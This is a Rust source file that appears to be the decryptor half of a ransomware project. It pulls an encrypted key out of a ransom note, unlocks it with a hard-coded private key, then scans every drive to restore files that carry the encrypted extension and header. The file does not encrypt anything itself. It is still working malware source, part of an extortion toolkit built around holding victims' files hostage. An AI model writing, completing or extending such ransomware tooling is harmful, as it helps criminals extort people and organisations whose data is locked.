mod config;
mod utils;

use std::error::Error;
use std::fs::File;
use std::io::{self, Cursor, Write};
use std::thread::Builder;
use std::time::Instant;
use std::{env, format, fs, process};
use std::path::PathBuf;

use shared::*;

use crate::config::*;

// could probably be lowered even more
// but that dosnt rlly matter lol
const STACK_SIZE: usize = 64 * 1024 * 1024;

fn main() {
    Builder::new()
        .stack_size(STACK_SIZE)
        .spawn(real_main)
        .unwrap()
        .join()
        .unwrap();
}

fn real_main() {
    let args = env::args()
        .skip(1)
        .collect::<Vec<String>>();

    let mut crypt_key = Vec::new();

    let mut invert_extensions = false;

    let mut whitelisted_dirs = Vec::new();
    let mut whitelisted_names = Vec::new();
    let mut whitelisted_exts = Vec::new();

    if args.len() == 1 && DEDICATED {
        let note_path_str = args
            .first()
            .unwrap();

        let note_path = PathBuf::from(note_path_str);
        if !note_path.exists() || !note_path.is_file() {
            println!("path \"{}\" does not exist or is not a file\n", note_path.display());
            wait_for_exit(-1);
        }

        let encoded_encrypted_key = match utils::get_encrypted_key(&note_path, HEX_CHAR_SET) {
            Some(data) => data,
            None => {
                println!("failed to find the encrypted key\n");
                wait_for_exit(-1);
            }
        };

        let encrypted_key = match encode::hex_custom_decode(&encoded_encrypted_key, HEX_CHAR_SET) {
            Ok(key) => key,
            Err(err) => {
                println!("failed to decode the encrypted key - {}\n", err);
                wait_for_exit(-1);
            }
        };

        let (private_keys, _) = match key::import_key_pairs(Some(PRIVATE_KEY), None) {
            Ok((private_keys, _public_keys)) => (private_keys, _public_keys),
            Err(err) => {
                println!("failed to import private keys - {}\n", err);
                wait_for_exit(-1);
            }
        };

        crypt_key = match key::decrypt_key(&encrypted_key, &private_keys.unwrap()) {
            Ok(key) => key,
            Err(err) => {
                println!("failed to decrypt the encrypted key - {}\n", err);
                wait_for_exit(-1);
            }
        };

        invert_extensions = ADD_FILE_EXTENSION;

        whitelisted_dirs = WHITELISTED_DIRECTORIES
            .iter()
            .map(|path| path::expand_env_vars(path))
            .collect::<Vec<String>>();

        whitelisted_names = WHITELISTED_FILE_NAMES
            .iter()
            .map(|str| str.to_string())
            .collect::<Vec<String>>();

        whitelisted_exts = if invert_extensions {
            let mut whitelisted = Vec::with_capacity(1);
            whitelisted.push(ENCRYPTED_FILE_EXTENSION.to_string());

            whitelisted
        } else {
            WHITELISTED_FILE_EXTENSIONS
                .iter()
                .map(|str| str.to_string())
                .collect()
        };
    }

    // todo, handle if not dedicated

    if crypt_key.is_empty() {
        println!("the encryption key is empty");
        wait_for_exit(-1);
    }

    let start = Instant::now();

    let drives = drive::get_drives();

    for drive in &drives {
        file::enumerate_files(
            &drive,
            400,
            &whitelisted_dirs,
            &whitelisted_exts,
            &whitelisted_names,
            invert_extensions,
            |files| {
                for file in files {
                    let stdout = io::stdout();
                    let mut lock = stdout.lock();

                    match process_file(file, &crypt_key) {
                        Ok(_) => writeln!(lock, "[-] successfully decrypted - {}", file.display()).ok(),
                        Err(err) => writeln!(lock, "[!] failed to decrypt - {} ~ {}", file.display(), err).ok()
                    };
                }
            }
        );
    }

    println!("\nthe decryption has finished in {:?}\n", start.elapsed());
    wait_for_exit(0);
}

fn process_file(file_path: &PathBuf, key: &[u8]) -> Result<(), Box<dyn Error>> {
    let parent_path = file_path
        .parent()
        .unwrap();

    let header = header::ProcessedFileHeader::load_from(file_path)?;

    let original_file_name = crypt::decrypt_data(&header.encrypted_name, key)
        .map_err(|err| format!("failed to decrypt name: {}", err))?;

    let original_file_name = str::from_utf8(&original_file_name)?;

    let original_file_ext = crypt::decrypt_data(&header.encrypted_ext, key)
        .map_err(|err| format!("failed to decrypt extension: {}", err))?;

    let original_file_ext = str::from_utf8(&original_file_ext)?;

    let orginal_full_name = if original_file_ext.is_empty() {
        original_file_name.to_string()
    } else {
        format!("{}.{}", original_file_name, original_file_ext)
    };

    let original_file_path = parent_path.join(&orginal_full_name);
    let mut original_file = File::create(&original_file_path)?;

    let encrypted_data = fs::read(file_path)?;
    let header_len = header.header_len();

    if encrypted_data.len() < header_len {
        return Err("data is too short".into());
    }

    let encrypted_data_offset = &encrypted_data[header_len..];

    let mut cursor = Cursor::new(encrypted_data_offset);

    let chunk_count = header.encrypted_chunk_count as usize;
    file::read_decrypt_chunks(&mut cursor, &mut original_file, key, chunk_count)?;

    drop(original_file);

    if file_path != &original_file_path {
        fs::remove_file(file_path)?;
    }

    Ok(())
}

fn wait_for_exit(code: i32) -> ! {
    utils::get_input("press enter to exit");
    process::exit(code);
}
